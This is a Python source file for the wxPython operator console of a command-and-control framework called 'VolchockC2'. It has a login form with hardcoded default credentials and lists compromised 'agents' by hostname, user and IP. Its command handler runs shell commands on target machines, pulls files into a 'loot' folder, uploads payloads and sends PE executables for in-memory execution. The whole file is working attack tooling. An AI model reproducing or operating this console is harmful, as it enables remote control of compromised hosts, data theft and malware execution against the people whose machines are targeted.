import wx
import requests
from requests.auth import HTTPBasicAuth
from datetime import datetime
import os
import time
import threading
import base64

RED = wx.Colour(220, 30, 30)
GRAY = wx.Colour(70, 70, 70)
WHITE = wx.Colour(240, 240, 240)
INPUT_GRAY = wx.Colour(110, 110, 110)

def queue_shell_command(base_url, agent_id, command, auth):
    payload = {"command": command}
    resp = requests.post(f"{base_url}/agent/{agent_id}/command", json=payload, auth=auth)
    return resp


# login form
class LoginFrame(wx.Frame):
    def __init__(self):
        super().__init__(parent=None, title="", size=(450, 260))
        self.SetBackgroundColour(GRAY)
        panel = wx.Panel(self)
        panel.SetBackgroundColour(GRAY)
        vbox = wx.BoxSizer(wx.VERTICAL)
        title = wx.StaticText(panel, label="VolchockC2 - Login")
        title.SetForegroundColour(RED)
        title_font = title.GetFont()
        title_font.SetWeight(wx.FONTWEIGHT_BOLD)
        title_font.SetPointSize(16)
        title.SetFont(title_font)
        vbox.Add(title, flag=wx.ALIGN_CENTER | wx.TOP, border=5)
        ip_label = wx.StaticText(panel, label="   IP Address:")
        ip_label.SetForegroundColour(WHITE)
        port_label = wx.StaticText(panel, label="   Port:")
        port_label.SetForegroundColour(WHITE)
        user_label = wx.StaticText(panel, label="   Username:")
        user_label.SetForegroundColour(WHITE)
        pwd_label = wx.StaticText(panel, label="   Password:")
        pwd_label.SetForegroundColour(WHITE)
        self.ip_txt = wx.TextCtrl(panel, value="127.0.0.1", style=wx.TE_PROCESS_ENTER)
        self.port_txt = wx.TextCtrl(panel, value="8088", style=wx.TE_PROCESS_ENTER)
        self.user_txt = wx.TextCtrl(panel, value="user1", style=wx.TE_PROCESS_ENTER)
        self.pwd_txt = wx.TextCtrl(panel, value="superpassword", style=wx.TE_PASSWORD | wx.TE_PROCESS_ENTER)
        for ctrl in (self.ip_txt, self.port_txt, self.user_txt, self.pwd_txt):
            ctrl.SetBackgroundColour(INPUT_GRAY)
            ctrl.SetForegroundColour(WHITE)
        self.ip_txt.Bind(wx.EVT_TEXT_ENTER, self.on_login)
        self.port_txt.Bind(wx.EVT_TEXT_ENTER, self.on_login)
        self.user_txt.Bind(wx.EVT_TEXT_ENTER, self.on_login)
        self.pwd_txt.Bind(wx.EVT_TEXT_ENTER, self.on_login)
        grid = wx.FlexGridSizer(4, 2, 8, 8)
        grid.AddMany([
            (ip_label, 0, wx.ALIGN_CENTER_VERTICAL), (self.ip_txt, 1, wx.EXPAND),
            (port_label, 0, wx.ALIGN_CENTER_VERTICAL), (self.port_txt, 1, wx.EXPAND),
            (user_label, 0, wx.ALIGN_CENTER_VERTICAL), (self.user_txt, 1, wx.EXPAND),
            (pwd_label, 0, wx.ALIGN_CENTER_VERTICAL), (self.pwd_txt, 1, wx.EXPAND),
        ])
        grid.AddGrowableCol(1, 1)
        h_sizer = wx.BoxSizer(wx.HORIZONTAL)
        h_sizer.Add(grid, 1, wx.EXPAND | wx.ALL, 2)
        h_sizer.Add((15, 1))
        vbox.Add(h_sizer, flag=wx.EXPAND | wx.ALL, border=2)
        self.msg = wx.StaticText(panel, label="", style=wx.ALIGN_CENTER)
        self.msg.SetForegroundColour(RED)
        vbox.Add(self.msg, flag=wx.ALL | wx.EXPAND, border=2)
        self.login_btn = wx.Button(panel, label="Log in")
        self.login_btn.SetForegroundColour(RED)
        self.login_btn.Bind(wx.EVT_BUTTON, self.on_login)
        vbox.Add(self.login_btn, flag=wx.ALL | wx.ALIGN_CENTER, border=1)
        panel.SetSizer(vbox)
        self.login_btn.SetDefault()
        self.CenterOnScreen()

    def on_login(self, event):
        ip = self.ip_txt.GetValue()
        port = self.port_txt.GetValue()
        user = self.user_txt.GetValue()
        pwd = self.pwd_txt.GetValue()
        base_url = f"http://{ip}:{port}"
        auth = HTTPBasicAuth(user, pwd)
        try:
            resp = requests.get(f"{base_url}/agents", auth=auth, timeout=5)
            if resp.status_code == 401:
                self.msg.SetLabel("[!] Bad credentials.")
            elif not resp.ok:
                self.msg.SetLabel(f"[!] Fail to connect: {resp.status_code}")
            else:
                agents = resp.json().get("agents", [])
                self.Destroy()
                frame = MainFrame(base_url, auth, agents)
                frame.Show()
        except Exception as e:
            self.msg.SetLabel(f"[!] {str(e)}")


# main dashboard
class MainFrame(wx.Frame):
    def __init__(self, base_url, auth, agents):
        super().__init__(parent=None, title="VolchockC2", size=(900, 600))
        self.SetBackgroundColour(GRAY)
        self.base_url = base_url
        self.auth = auth
        self._agents = agents
        self.last_results = {}
        vbox = wx.BoxSizer(wx.VERTICAL)
        main_title = wx.StaticText(self, label="VolchockC2")
        main_title.SetForegroundColour(RED)
        main_title_font = main_title.GetFont()
        main_title_font.SetWeight(wx.FONTWEIGHT_BOLD)
        main_title_font.SetPointSize(16)
        main_title.SetFont(main_title_font)
        vbox.Add(main_title, flag=wx.ALIGN_CENTER | wx.TOP | wx.BOTTOM, border=10)
        splitter = wx.SplitterWindow(self, style=wx.SP_LIVE_UPDATE)
        splitter.SetMinimumPaneSize(50)
        splitter.SetMinSize((900, 150))
        splitter.SetBackgroundColour(GRAY)
        left_panel = wx.Panel(splitter)
        left_panel.SetBackgroundColour(GRAY)
        left_sizer = wx.BoxSizer(wx.VERTICAL)
        self.agent_list = wx.ListBox(
            left_panel,
            choices=[f"{ag['agent_id']} ({ag['hostname']})" for ag in agents]
        )
        self.agent_list.Bind(wx.EVT_LISTBOX, self.on_agent_selected)
        self.agent_list.SetBackgroundColour(INPUT_GRAY)
        self.agent_list.SetForegroundColour(WHITE)
        left_sizer.Add(self.agent_list, 1, wx.EXPAND | wx.ALL, 4)
        left_panel.SetSizer(left_sizer)
        right_panel = wx.Panel(splitter)
        right_panel.SetBackgroundColour(GRAY)
        right_sizer = wx.BoxSizer(wx.VERTICAL)
        margin_panel = wx.Panel(right_panel)
        margin_panel.SetBackgroundColour(INPUT_GRAY)
        margin_sizer = wx.BoxSizer(wx.VERTICAL)
        self.agent_info_panel = wx.Panel(margin_panel)
        self.agent_info_panel.SetBackgroundColour(INPUT_GRAY)
        self.agent_info_sizer = wx.FlexGridSizer(0, 2, 8, 10)
        self.agent_info_panel.SetSizer(self.agent_info_sizer)
        margin_sizer.Add(self.agent_info_panel, 1, wx.EXPAND | wx.ALL, 0)
        margin_panel.SetSizer(margin_sizer)
        right_sizer.Add(margin_panel, 1, wx.EXPAND | wx.ALL, 18)
        right_panel.SetSizer(right_sizer)
        splitter.SplitVertically(left_panel, right_panel, sashPosition=450)
        splitter.SetSize((900, 450))
        splitter.SetSashPosition(450)
        vbox.Add(splitter, 0, wx.EXPAND | wx.ALL, 2)
        cmd_panel = wx.Panel(self)
        cmd_panel.SetBackgroundColour(GRAY)
        cmd_vbox = wx.BoxSizer(wx.VERTICAL)
        self.output = wx.TextCtrl(cmd_panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.HSCROLL)
        self.output.SetBackgroundColour(INPUT_GRAY)
        self.output.SetForegroundColour(WHITE)
        cmd_vbox.Add(self.output, 2, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 5)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.cmd_txt = wx.TextCtrl(cmd_panel, style=wx.TE_PROCESS_ENTER)
        self.cmd_txt.SetBackgroundColour(INPUT_GRAY)
        self.cmd_txt.SetForegroundColour(WHITE)
        self.cmd_txt.Bind(wx.EVT_TEXT_ENTER, self.on_shell_command)
        self.send_btn = wx.Button(cmd_panel, label="Send")
        self.send_btn.SetForegroundColour(RED)
        self.send_btn.Bind(wx.EVT_BUTTON, self.on_shell_command)
        hbox.Add(self.cmd_txt, 1, wx.EXPAND | wx.ALL, 2)
        hbox.Add(self.send_btn, 0, wx.ALL, 2)
        cmd_vbox.Add(hbox, 0, wx.EXPAND | wx.ALL, 2)
        cmd_panel.SetSizer(cmd_vbox)
        vbox.Add(cmd_panel, 1, wx.EXPAND | wx.ALL, 2)
        self.agent_refresh_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_auto_refresh, self.agent_refresh_timer)
        self.agent_refresh_timer.Start(5000)
        self.SetSizer(vbox)
        self.Centre()
        if agents:
            self.agent_list.SetSelection(0)
            self.show_agent_info(agents[0])
        else:
            self.clear_agent_info()


    def clear_agent_info(self):
        for child in self.agent_info_panel.GetChildren():
            child.Destroy()
        self.agent_info_sizer.Clear()
        self.agent_info_panel.Layout()

    def on_auto_refresh(self, event):
        try:
            resp = requests.get(f"{self.base_url}/agents", auth=self.auth, timeout=3)
            if resp.ok:
                agents = resp.json().get("agents", [])
                cur_sel = self.agent_list.GetSelection()
                cur_sel_id = None
                if cur_sel != wx.NOT_FOUND and cur_sel < len(self._agents):
                    cur_sel_id = self._agents[cur_sel].get('agent_id', None)
                self._agents = agents
                self.agent_list.Clear()
                self.agent_list.AppendItems([f"{ag['agent_id']} ({ag['hostname']})" for ag in agents])
                sel_index = 0
                if cur_sel_id:
                    for idx, ag in enumerate(agents):
                        if ag.get('agent_id', None) == cur_sel_id:
                            sel_index = idx
                            break
                if agents:
                    self.agent_list.SetSelection(sel_index)
                    self.show_agent_info(agents[sel_index])
                else:
                    self.clear_agent_info()
            else:
                self.output.AppendText(f"[!] Error while refreshing: {resp.status_code}\n")
        except Exception as e:
            self.output.AppendText(f"[!] Exception: {e}\n")

    def on_agent_selected(self, event):
        idx = self.agent_list.GetSelection()
        if idx != wx.NOT_FOUND and idx < len(self._agents):
            self.show_agent_info(self._agents[idx])
        else:
            self.clear_agent_info()

    def get_agent_info(self, agent_id):
        resp = requests.get(f"{self.base_url}/agent/{agent_id}/info", auth=self.auth, timeout=3)
        if resp.ok:
            info = resp.json().get("info", {})
            ret_str = ""
            for k, v in info.items():
                if k == "last_seen":
                    ret_str += k + ": " + datetime.fromtimestamp(v).strftime('%Y-%m-%d %H:%M:%S') + "\n"
                else:
                    ret_str += k + ": " + str(v) + "\n"
            return ret_str
        else:
            return "[!] Can't retrieve agent infos.\n"

    def show_agent_info(self, agent):
        for child in self.agent_info_panel.GetChildren():
            child.Destroy()
        self.agent_info_sizer.Clear()
        last_seen = agent.get('last_seen', '')
        try:
            last_seen_str = datetime.fromtimestamp(last_seen).strftime('%Y-%m-%d %H:%M:%S') if last_seen else ''
        except:
            last_seen_str = str(last_seen)
        fields = [
            ("ID", agent.get('agent_id', '')),
            ("Hostname", agent.get('hostname', '')),
            ("User", agent.get('username', '')),
            ("IP", agent.get('ip', '')),
            ("Last seen", last_seen_str)
        ]
        label_font = wx.Font(wx.FontInfo(10).Bold())
        for label, value in fields:
            static_label = wx.StaticText(self.agent_info_panel, label=label + " :")
            static_label.SetForegroundColour(WHITE)
            static_label.SetFont(label_font)
            static_value = wx.StaticText(self.agent_info_panel, label=str(value))
            static_value.SetForegroundColour(WHITE)
            self.agent_info_sizer.Add(static_label, 0, wx.ALIGN_LEFT | wx.ALIGN_CENTER_VERTICAL)
            self.agent_info_sizer.Add(static_value, 0, wx.EXPAND)
        self.agent_info_panel.Layout()



    # shell functions
    def get_shell_result(self, agent_id):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        def show_results():
                            self.output.AppendText(f"\n[Result]:\n")
                            for res in results:
                                self.output.AppendText(f"{res}\n")
                        wx.CallAfter(show_results)
                        return
                time_out = time_out - 1
                time.sleep(1)
            wx.CallAfter(self.output.AppendText, "[!] Timeout, no result received.\n")
        except Exception as e:
            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")

    def thread_get_shell_result(self, agent_id):
        self.get_shell_result(agent_id)
        wx.CallAfter(self.cmd_txt.SetValue, "")



    # download functions
    def get_downloaded_file(self, agent_id, payload_cmd):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        latest = results[0]
                        loot_dir = 'loot'
                        if not os.path.exists(loot_dir):
                            os.makedirs(loot_dir)
                        agent_dir = 'loot/'+str(agent_id)
                        if not os.path.exists(agent_dir):
                            os.makedirs(agent_dir)
                        filename = os.path.basename(payload_cmd)
                        dest_path = str(agent_dir)+"/"+str(filename)
                        with open(dest_path, 'wb') as f:
                            f.write(base64.b64decode(latest))
                        self.output.AppendText(f"[+] File saved : {dest_path} \n\n")
                        time_out = 0
                        return
                time_out = time_out - 1
                time.sleep(1)
            self.output.AppendText("[!] Timeout, no result received.\n")
        except Exception as e:
            self.output.AppendText(f"[!] Exception: {e}\n")




    # upload functions
    def get_upload_result(self, agent_id):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        return
                time_out = time_out - 1
                time.sleep(1)
        except Exception as e:
            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")

    def thread_get_upload_result(self, agent_id):
        self.get_upload_result(agent_id)




    def on_shell_command(self, event):
        selection = self.agent_list.GetSelection()
        if selection == wx.NOT_FOUND or not self._agents:
            self.output.AppendText("[!] Please select an agent.\n")
            self.cmd_txt.SetValue("")
            return
        cmd = self.cmd_txt.GetValue().strip()
        if not cmd:
            self.output.AppendText("[!] Please enter a command.\n")
            self.cmd_txt.SetValue("")
            return
        agent = self._agents[selection]
        agent_id = agent['agent_id']
        info = ""
        if cmd.lower().startswith("shell "):
            payload_cmd = cmd[len("shell "):].strip()
            display_cmd = str({"cmd": f"{payload_cmd}"})
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            info = f"[+] Shell command sent: {payload_cmd} \n"
            self.output.AppendText(info)
            self.cmd_txt.SetValue("[+] Retrieving command result...")
            wx.Yield()
            threading.Thread(target=self.thread_get_shell_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("download "):
            payload_cmd = cmd[len("download "):].strip()
            display_cmd = str({"download": f"{payload_cmd}"})
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            info = f"[+] Trying to download file: {payload_cmd} \n"
            self.output.AppendText(info)
            self.cmd_txt.SetValue("[+] Retrieving file data...")
            wx.Yield()
            self.get_downloaded_file(agent_id, payload_cmd)
        elif cmd.lower().startswith("upload "):
            payload_cmd = cmd[len("upload "):].strip()
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode( str({"filename":filename, "content":b64_encoded_file}).encode("utf-8", errors="replace"))
            display_cmd = str({"upload":fil_props})
            info = f"[+] Trying to upload file: {payload_cmd} \n"
            self.output.AppendText(info)
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText("[+] File sent.\n")
            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("exec-pe "):
            cmd = cmd[len("exec-pe "):].strip()
            parts = cmd.strip().split(" ")
            payload_cmd = parts[0]
            args = " ".join(parts[1:])
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            b64_encoded_args = base64.b64encode(args.encode("utf-8", errors="replace"))
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode( str({"filename":filename, "content":b64_encoded_file, "args":b64_encoded_args}).encode("utf-8", errors="replace"))
            display_cmd = str({"exec-pe":fil_props})
            info = f"[+] Trying to execute PE in-memory: {payload_cmd} \n"
            self.output.AppendText(info)
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText("[+] PE sent for execution.\n")
            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
        else:
            display_help = """
Available Commands:
--------------------
- shell <cmd>
    Execute the specified shell command on the target machine.
    Example: shell whoami

- download <remote_file_path>
    Download a file from the target machine to the server.
    Example: download C:\\Users\\user\\Desktop\\file.txt

- upload <local_file_path>
    Upload a file from the server to the target machine.
    Example: upload /home/user/payload.exe

- exec-pe <local_file_path>
    In-memory execution of a local PE on the target machine.
    Example: exec-pe /home/user/payload.exe

"""
            self.output.AppendText(display_help + "\n")
        self.cmd_txt.SetValue("")




if __name__ == '__main__':
    app = wx.App(False)
    login = LoginFrame()
    login.Show()
    app.MainLoop()
